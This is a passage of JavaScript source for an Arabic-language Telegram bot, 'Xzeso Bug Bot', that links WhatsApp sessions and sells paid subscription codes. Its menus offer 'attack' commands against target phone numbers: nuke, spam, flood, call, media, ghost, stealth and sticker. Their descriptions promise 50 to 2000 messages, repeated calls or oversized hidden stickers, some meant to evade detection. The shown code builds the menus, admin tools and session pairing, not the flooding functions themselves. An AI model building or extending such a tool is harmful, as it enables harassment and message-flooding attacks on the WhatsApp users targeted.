
    subs.users[userId] = { plan: `${target.hours} ساعة`, activatedAt: now, expiresAt, codes: [code] };
    target.used = true;
    target.usedBy = userId;
    target.usedAt = now;
    safeWriteJSON("./storage/subscriptions.json", subs);
    safeWriteJSON("./storage/subscription_codes.json", db);

    const remainingH = Math.floor((expiresAt - now) / 3600000);
    await ctx.reply(`✅ <b>تم تفعيل الاشتراك!</b>\n⏰ المدة: ${target.hours} ساعة\n📅 ينتهي بعد ${remainingH} ساعة`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`REDEEM ERROR: ${e.message}`);
    ctx.reply("❌ خطأ في تفعيل الرمز");
  }
});

// =====================================================================
// COMMAND: /freemode (Toggle Free Mode)
// =====================================================================

bot.command("freemode", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");

    settingsDb.freeMode = !settingsDb.freeMode;
    safeWriteJSON("./database/settings.json", settingsDb);

    if (settingsDb.freeMode) {
      await ctx.reply("🟢 <b>الوضع المجاني مفعل!</b>\n✅ جميع المستخدمين يمكنهم استخدام البوت الآن", { parse_mode: "HTML" });
      // Notify all users
      for (const uid of usersDb) {
        try { await bot.api.sendMessage(uid, "🆓 <b>الوضع المجاني مفعل!</b>\nأنت الآن تستطيع استخدام جميع أوامر البوت", { parse_mode: "HTML" }); } catch {}
      }
    } else {
      await ctx.reply("🔴 <b>الوضع المجاني معطل!</b>\n❌ فقط المستخدمين المدفوعين يمكنهم الاستخدام", { parse_mode: "HTML" });
    }
  } catch (e) {
    log.error(`FREEMODE ERROR: ${e.message}`);
    ctx.reply("❌ خطأ");
  }
});

// =====================================================================
// COMMAND: /maintmode (Toggle Maintenance Mode)
// =====================================================================

bot.command("maintmode", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");

    settingsDb.maintenance = !settingsDb.maintenance;
    safeWriteJSON("./database/settings.json", settingsDb);

    if (settingsDb.maintenance) {
      await ctx.reply("🛠️ <b>وضع الصيانة مفعل!</b>\nالمستخدمون سيرون رسالة الصيانة", { parse_mode: "HTML" });
      // Notify all users
      for (const uid of usersDb) {
        try { await bot.api.sendMessage(uid, `🛠️ <b>البوت في وضع الصيانة</b>\n\n${settingsDb.maintenanceMsg}`, { parse_mode: "HTML" }); } catch {}
      }
    } else {
      await ctx.reply("✅ <b>وضع الصيانة معطل!</b>\nالبوت يعمل بشكل طبيعي", { parse_mode: "HTML" });
    }
  } catch (e) {
    log.error(`MAINTMODE ERROR: ${e.message}`);
    ctx.reply("❌ خطأ");
  }
});

// =====================================================================
// COMMAND: /maintmsg (Set Maintenance Message)
// =====================================================================

bot.command("maintmsg", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("⚠️ الاستخدام: <code>/maintmsg رسالة الصيانة</code>");

    settingsDb.maintenanceMsg = text;
    safeWriteJSON("./database/settings.json", settingsDb);
    await ctx.reply(`✅ <b>تم تحديث رسالة الصيانة!</b>\n📝 ${text}`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`MAINTMSG ERROR: ${e.message}`);
    ctx.reply("❌ خطأ");
  }
});

// =====================================================================
// COMMAND: /setbotpic (Set Bot Profile Picture)
// =====================================================================

bot.command("setbotpic", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");

    const args = ctx.message.text.split(" ");
    const url = args[1];
    if (!url) return ctx.reply("⚠️ الاستخدام: <code>/setbotpic رابط_الصورة</code>\n🖼️ تغيير صورة البوت في قائمة /start");

    setBotImageUrl(url);
    await ctx.reply(`✅ <b>تم تحديث صورة البوت!</b>\n🔗 الرابط: ${url}`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`SETBOTPIC ERROR: ${e.message}`);
    ctx.reply("❌ خطأ");
  }
});

// =====================================================================
// COMMAND: /botinfo (Developer Command)
// =====================================================================

bot.command("botinfo", async (ctx) => {
  try {
    const uptime = formatUptime(process.uptime());
    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const memTotal = (os.totalmem() / 1024 / 1024 / 1024).toFixed(1);
    const memFree = (os.freemem() / 1024 / 1024 / 1024).toFixed(1);
    const pkg = require("./package.json");

    const info = `<blockquote>
<b>👨‍💻 معلومات البوت</b>

━━━━━━━━━━━━━━━━━━━━━━━
📛 الاسم: ${pkg.name}
📦 الإصدار: ${pkg.version}
⏱️ التشغيل: ${uptime}
💾 الذاكرة: ${memUsed} MB
📱 الجلسات: ${Object.keys(waClients).length}
👥 المستخدمين: ${usersDb.length}

━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>أوامر الهجوم:</b>
/nuke /spam /call /media /mass /sticker /cutinternet /ghost /shield /stealth

━━━━━━━━━━━━━━━━━━━━━━━
🎫 <b>الاشتراكات:</b>
/makencode /redeem /listcodes
🆓 <b>مجاني:</b> /freemode
🛠️ <b>صيانة:</b> /maintmode
👑 <b>أدمن:</b> /admin /addadmin

━━━━━━━━━━━━━━━━━━━━━━━
🔧 Node.js ${process.version}
📊 إجمالي الأوامر: ~50+ أمر
━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`;

    await ctx.reply(info, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`BOTINFO ERROR: ${e.message}`);
    ctx.reply("❌ خطأ");
  }
});

// =====================================================================
// COMMAND: /stats
// =====================================================================

bot.command("stats", async (ctx) => {
  try {
    const uptime = formatUptime(process.uptime());
    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const codesDb = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;

    await ctx.reply(`📊 <b>الإحصائيات</b>

⏱️ التشغيل: ${uptime}
💾 الذاكرة: ${memUsed} MB
👥 المستخدمين: ${usersDb.length}
📱 الجلسات: ${Object.keys(waClients).length}
🎫 الرموز النشطة: ${codesDb.codes.filter(c => !c.used).length}
🔑 الاشتراكات الفعالة: ${activeSubs}
🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}
🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}`, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /ping
// =====================================================================

bot.command("ping", async (ctx) => {
  const start = Date.now();
  const msg = await ctx.reply("🏓 جاري الاختبار...");
  const latency = Date.now() - start;
  await ctx.api.editMessageText(msg.chat.id, msg.message_id,
    `🏓 <b>Pong!</b>\n📊 الكسل: ${latency}ms\n⏱️ التشغيل: ${formatUptime(process.uptime())}`, { parse_mode: "HTML" });
});

// =====================================================================
// COMMAND: /adminpanel (Admin Panel)
// =====================================================================

bot.command("adminpanel", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");

    const stats = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;

    await ctx.reply(`👑 <b>لوحة تحكم الأدمن</b>

━━━━━━━━━━━━━━━━━━━━━━━
👥 المستخدمين: ${usersDb.length}
🎫 الرموز: ${stats.codes.length}
🔑 الاشتراكات: ${activeSubs}
🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}
🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}
🖼️ صورة البوت: ${settingsDb.botImage ? "✅" : "❌"}
━━━━━━━━━━━━━━━━━━━━━━━

📋 اختر من القائمة:</blockquote>`, { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /reqpair (WhatsApp Pairing)
// =====================================================================

bot.command("reqpair", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ");
    const phone = args[1]?.replace(/[^0-9]/g, "");
    if (!phone || phone.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/reqpair 628xxxxxxxx</code>\n📱 أدخل رقم واتساب للربط");

    const waitMsg = await ctx.reply("⏳ جاري إنشاء كود الربط...");
    const code = await requestPairingCode(userId, phone);

    await ctx.api.deleteMessage(userId, waitMsg.message_id).catch(() => {});
    await ctx.reply(`✅ <b>كود الربط جاهز!</b>\n📱 الرقم: <code>${phone}</code>\n🔐 الكود: <code>${code}</code>\n\nأدخل الكود في تطبيق واتساب`, { parse_mode: "HTML" });
  } catch (e) {
    log.error(`REQPAIR ERROR: ${e.message}`);
    ctx.reply("❌ فشل الربط");
  }
});

// =====================================================================
// COMMAND: /clearsesi (Clear Session)
// =====================================================================

bot.command("clearsesi", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const result = await deleteSessionForUser(userId);
    ctx.reply(result ? "✅ تم حذف الجلسة بنجاح!" : "❌ لم يتم العثور على جلسة");
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /listpair (List Sessions)
// =====================================================================

bot.command("listpair", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const sessions = Object.entries(waClients).filter(([, v]) => v.status === "open");
    let text = "📱 <b>الجلسات النشطة:</b>\n\n";
    sessions.forEach(([id, v]) => {
      text += `• User: ${id}\n  Status: ✅ Open\n  Last Activity: ${new Date(v.lastActivity).toLocaleString()}\n\n`;
    });
    if (sessions.length === 0) text += "📭 لا توجد جلسات نشطة";
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /sessions (Session Stats)
// =====================================================================

bot.command("sessions", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ مخصص للملك والموزعين!");

    const total = Object.keys(waClients).length;
    const active = Object.entries(waClients).filter(([, v]) => v.status === "open").length;
    await ctx.reply(`📊 <b>إحصائيات الجلسات</b>\n\n📱 الإجمالي: ${total}\n✅ النشطة: ${active}\n❌ غير النشطة: ${total - active}`, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /addadmin (Add Admin)
// =====================================================================

bot.command("addadmin", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");

    const target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply("⚠️ الاستخدام: <code>/addadmin 123456789</code>\n👥 إضافة مسؤول");

    if (!settingsDb.admins.includes(target)) {
      settingsDb.admins.push(target);
      settingsDb.permissions[target] = { addedAt: Date.now(), canManageUsers: true, canManageCodes: true };
      safeWriteJSON("./database/settings.json", settingsDb);
      ctx.reply(`✅ تمت إضافة المسؤول: ${target}`, { parse_mode: "HTML" });
    } else {
      ctx.reply(`⚠️ ${target} مسؤول بالفعل`);
    }
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /deladmin (Remove Admin)
// =====================================================================

bot.command("deladmin", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");

    const target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply("⚠️ الاستخدام: <code>/deladmin 123456789</code>");

    settingsDb.admins = settingsDb.admins.filter(a => a !== target);
    delete settingsDb.permissions[target];
    safeWriteJSON("./database/settings.json", settingsDb);
    ctx.reply(`🗑 تم حذف المسؤول: ${target}`);
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /listadmin (List Admins)
// =====================================================================

bot.command("listadmin", async (ctx) => {
  try {
    if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للمالك فقط!");

    const admins = settingsDb.admins || [];
    let text = "👥 <b>قائمة المسؤولين:</b>\n\n";
    admins.forEach((a, i) => { text += `${i + 1}. ${a}\n` });
    if (admins.length === 0) text += "📭 لا يوجد مسؤولون";
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /listcodes (List Subscription Codes)
// =====================================================================

bot.command("listcodes", async (ctx) => {
  try {
    if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للمالك فقط!");

    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
    let text = "🎫 <b>قائمة الرموز:</b>\n\n";
    db.codes.forEach(c => {
      text += `${c.used ? "✅" : "❌"} <code>${c.code}</code> - ${c.hours} ساعة\n`;
    });
    if (db.codes.length === 0) text += "📭 لا توجد رموز";
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// COMMAND: /broadcast (Broadcast)
// =====================================================================

bot.command("broadcast", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ مخصص للملك والموزعين!");

    const msg = ctx.message.text.split(" ").slice(1).join(" ");
    if (!msg) return ctx.reply("⚠️ الاستخدام: <code>/broadcast رسالة</code>");

    let sent = 0, failed = 0;
    for (const id of usersDb) {
      try { await bot.api.sendMessage(id, msg); sent++; } catch { failed++; }
    }
    ctx.reply(`✅ تم الإرسال: ${sent}\n❌ فشل: ${failed}`, { parse_mode: "HTML" });
  } catch (e) { ctx.reply("❌ خطأ"); }
});

// =====================================================================
// CALLBACK HANDLERS
// =====================================================================

// Back to main menu
bot.callbackQuery("back_to_main", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const caption = `<blockquote><b>👋 أهلاً ${userDisplay}!</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━\n🔥 <b>Xzeso Bug Bot V6.0</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n📢 اختر من القائمة:</blockquote>`;

    await ctx.editMessageText(caption, { parse_mode: "HTML", reply_markup: getMainMenuKeyboard(ctx.from.id.toString()) }
    );
  } catch (e) { log.error(`back_to_main error: ${e.message}`); }
});

// Main Menu buttons
bot.callbackQuery("menu_attacks", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("🔥 <b>أوامر الهجوم</b>\n\nاختر نوع الهجوم:", { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("menu_sessions", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("📱 <b>الجلسات والأرقام</b>\n\nإدارة جلسات الواتساب:", { parse_mode: "HTML", reply_markup: getSessionsKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("menu_settings", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("⚙️ <b>الإعدادات</b>\n\nاضبط إعدادات البوت:", { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("menu_subscriptions", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("🎫 <b>الاشتراكات</b>\n\nإنشاء وإدارة رموز الاشتراك:", { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("menu_developer", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("👨‍💻 <b>المطور</b>\n\nأدوات المطور والإحصائيات:", { parse_mode: "HTML", reply_markup: getDeveloperKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("menu_free", async (ctx) => {
  await ctx.answerCallbackQuery();
  const status = isFreeMode() ? "✅ مفعل" : "❌ معطل";
  await ctx.editMessageText(
    `🆓 <b>الوضع المجاني</b>\n\nالحالة الحالية: ${status}\n\n${isFreeMode() ? "✅ جميع المستخدمين يمكنهم استخدام البوت" : "🔒 فقط المستخدمين المدفوعين"}`,
    { parse_mode: "HTML" }
  );
});

bot.callbackQuery("menu_maintenance", async (ctx) => {
  await ctx.answerCallbackQuery();
  const status = isMaintenance() ? "✅ مفعل" : "❌ معطل";
  await ctx.editMessageText(
    `🛠️ <b>وضع الصيانة</b>\n\nالحالة: ${status}\n\n${isMaintenance() ? `📝 الرسالة: ${settingsDb.maintenanceMsg}` : "🛠️ فعّل الصيانة لإعلام المستخدمين"}`,
    { parse_mode: "HTML" }
  );
});

// Settings buttons
bot.callbackQuery("set_bot_image", async (ctx) => {
  await ctx.answerCallbackQuery();
  const currentImage = getBotImageUrl();
  await ctx.editMessageText(
    `🖼️ <b>صورة البوت</b>\n\nالرابط الحالي: ${currentImage}\n\nاستخدم <code>/setbotpic رابط_جديد</code> لتغييرها`,
    { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("⬅️ رجوع", "back_to_main") }
  );
});

bot.callbackQuery("toggle_free_mode", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();

  settingsDb.freeMode = !settingsDb.freeMode;
  safeWriteJSON("./database/settings.json", settingsDb);
  await ctx.editMessageText(
    `🆓 <b>الوضع المجاني</b>\n\n${settingsDb.freeMode ? "✅ مفعل - جميع المستخدمين يمكنهم استخدام البوت" : "❌ معطل - فقط المدفوعين"}`,
    { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("toggle_maintenance", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();

  settingsDb.maintenance = !settingsDb.maintenance;
  safeWriteJSON("./database/settings.json", settingsDb);

  if (settingsDb.maintenance) {
    for (const uid of usersDb) {
      try { await bot.api.sendMessage(uid, `🛠️ <b>البوت في وضع الصيانة</b>\n\n${settingsDb.maintenanceMsg}`, { parse_mode: "HTML" }); } catch {}
    }
  }

  await ctx.editMessageText(
    `🛠️ <b>الصيانة</b>\n\n${settingsDb.maintenance ? "✅ مفعل" : "❌ معطل"}\n\n${settingsDb.maintenance ? `📝 ${settingsDb.maintenanceMsg}` : ""}`,
    { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

// Admin buttons
bot.callbackQuery("menu_admins", async (ctx) => {
  await ctx.answerCallbackQuery();
  const admins = settingsDb.admins || [];
  await ctx.editMessageText(
    `👥 <b>إدارة المسؤولين</b>\n\nالمسؤولون (${admins.length}):\n${admins.map((a, i) => `${i + 1}. ${a}`).join("\n") || "📭 لا يوجد"}`,
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("admin_add", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "👥 <b>إضافة مسؤول</b>\n\nاستخدم الأمر: <code>/addadmin 123456789</code>",
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("admin_remove", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "👥 <b>حذف مسؤول</b>\n\nاستخدم الأمر: <code>/deladmin 123456789</code>",
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("admin_list", async (ctx) => {
  await ctx.answerCallbackQuery();
  const admins = settingsDb.admins || [];
  const text = admins.length > 0
    ? `👥 <b>المسؤولون:</b>\n\n${admins.map((a, i) => `${i + 1}. ${a}`).join("\n")}`
    : "📭 لا يوجد مسؤولون";
  await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) });
});

bot.callbackQuery("admin_codes", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🎫 <b>إدارة رموز الاشتراك</b>\n\nاستخدم <code>/makencode ساعات</code> لإنشاء رمز\nاستخدم <code>/listcodes</code> لعرض الرموز",
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

// Developer buttons
bot.callbackQuery("dev_stats", async (ctx) => {
  await ctx.answerCallbackQuery();
  const uptime = formatUptime(process.uptime());
  const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
  await ctx.editMessageText(
    `📊 <b>الإحصائيات</b>\n\n⏱️ التشغيل: ${uptime}\n💾 الذاكرة: ${memUsed} MB\n👥 المستخدمين: ${usersDb.length}\n📱 الجلسات: ${Object.keys(waClients).length}`,
    { parse_mode: "HTML", reply_markup: getDeveloperKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("dev_tools", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔧 <b>أدوات المطور</b>\n\n• /ping - اختبار السرعة\n• /botinfo - معلومات البوت\n• /stats - الإحصائيات\n• /broadcast - بث رسالة\n\n⬅️ رجوع",
    { parse_mode: "HTML", reply_markup: getDeveloperKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("dev_logs", async (ctx) => {
  await ctx.answerCallbackQuery();
  const logsDb = safeReadJSON("./storage/logs.json", []);
  const recentLogs = logsDb.slice(-10).reverse() || [];
  const text = recentLogs.length > 0
    ? recentLogs.map(l => `• ${l}`).join("\n")
    : "📭 لا توجد سجلات";
  await ctx.editMessageText(`📋 <b>السجلات</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getDeveloperKeyboard(ctx.from.id.toString()) });
});

// Subscription buttons
bot.callbackQuery("sub_create", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🎫 <b>إنشاء رمز اشتراك</b>\n\nاستخدم: <code>/makencode 24</code>\nلإنشاء رمز لمدة 24 ساعة",
    { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("sub_list", async (ctx) => {
  await ctx.answerCallbackQuery();
  const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
  const text = db.codes.length > 0
    ? db.codes.map(c => `${c.used ? "✅" : "❌"} <code>${c.code}</code> - ${c.hours} ساعة`).join("\n")
    : "📭 لا توجد رموز";
  await ctx.editMessageText(`🎫 <b>قائمة الرموز</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard(ctx.from.id.toString()) });
});

bot.callbackQuery("sub_redeem", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔑 <b>تفعيل رمز</b>\n\nاستخدم: <code>/redeem XZ-ABCD12</code>",
    { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("sub_active", async (ctx) => {
  await ctx.answerCallbackQuery();
  const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
  const active = Object.entries(subsDb.users).filter(([, v]) => v.expiresAt > Date.now());
  const text = active.length > 0
    ? active.map(([id, v]) => `• ${id}: ${Math.ceil((v.expiresAt - Date.now()) / 3600000)} ساعة متبقية`).join("\n")
    : "📭 لا توجد اشتراكات نشطة";
  await ctx.editMessageText(`⏰ <b>الاشتراكات النشطة</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSubscriptionKeyboard(ctx.from.id.toString()) });
});

// Sessions buttons
bot.callbackQuery("sess_list", async (ctx) => {
  await ctx.answerCallbackQuery();
  const sessions = Object.entries(waClients).filter(([, v]) => v.status === "open");
  const text = sessions.length > 0
    ? sessions.map(([id, v]) => `• ${id}: ✅ ${new Date(v.lastActivity).toLocaleString()}`).join("\n")
    : "📭 لا توجد جلسات";
  await ctx.editMessageText(`📋 <b>الجلسات النشطة</b>\n\n${text}`, { parse_mode: "HTML", reply_markup: getSessionsKeyboard(ctx.from.id.toString()) });
});

bot.callbackQuery("sess_new", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "➕ <b>جلسة جديدة</b>\n\nاستخدم: <code>/reqpair 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getSessionsKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("sess_clear", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "⚠️ <b>حذف جميع الجلسات</b>\n\nهل أنت متأكد؟",
    { parse_mode: "HTML",
      reply_markup: new InlineKeyboard()
        .text("✅ نعم", "confirm_clear_all")
        .text("❌ لا", "back_to_main")
    }
  );
});

bot.callbackQuery("confirm_clear_all", async (ctx) => {
  await ctx.answerCallbackQuery();
  await clearAllSessions();
  await ctx.editMessageText("✅ تم حذف جميع الجلسات!", { parse_mode: "HTML", reply_markup: getSessionsKeyboard(ctx.from.id.toString()) });
});

bot.callbackQuery("sess_stats", async (ctx) => {
  await ctx.answerCallbackQuery();
  const total = Object.keys(waClients).length;
  const active = Object.entries(waClients).filter(([, v]) => v.status === "open").length;
  await ctx.editMessageText(`📊 <b>إحصائيات الجلسات</b>\n\n📱 الإجمالي: ${total}\n✅ النشطة: ${active}`, { parse_mode: "HTML", reply_markup: getSessionsKeyboard(ctx.from.id.toString()) });
});

// Attack buttons
bot.callbackQuery("attack_nuke", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "💥 <b>هجوم نووي</b>\n\nيرسل 50 رسالة متتالية للهدف.\n\nاستخدم: <code>/nuke 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_mass", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🎯 <b>هجوم متعدد</b>\n\nيستهدف أكثر من رقم في نفس الوقت.\n\nاستخدم: <code>/mass 628xxx,628yyy</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_call", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📞 <b>قرصنة صوتية</b>\n\nإرسال مكالمات صوتية متكررة.\n\nاستخدم: <code>/call 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_flood", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "💬 <b>فيضان رسائل</b>\n\nإرسال 1000 رسالة للهدف.\n\nاستخدم: <code>/flood 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_media", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🖼️ <b>فيضان صور</b>\n\nإرسال 200 صورة للهدف.\n\nاستخدم: <code>/media 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_ghost", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "👻 <b>هجوم خفي</b>\n\nإرسال 500 رسالة غير مكتشفة مع viewOnceMessage.\n\nاستخدم: <code>/ghost 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_invisi", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔒 <b>رسائل غير مرئية</b>\n\n1000 رسالة مخفية تماماً مع ephemeral messages.\n\nاستخدم: <code>/invisisendx 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_shield", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🛡️ <b>درع الحماية</b>\n\nيرسل 5 رسائل حماية للهدف.\n\nاستخدم: <code>/shield 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_stealth", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🗡️ <b>وضع التسلل</b>\n\nإرسال 1000 رسالة غير مكتشفة.\n\nاستخدم: <code>/stealth 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

// Missing attack callbacks
bot.callbackQuery("attack_spam", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📨 <b>سبام قوي</b>\n\n2000 رسالة متوازية.\n\nاستخدم: <code>/spam 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_stickers", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📸 <b>ستكرات مخفية</b>\n\n2000 ستكر ضخم مخفي.\n\nاستخدم: <code>/sticker 628xxxxxxxx</code>",
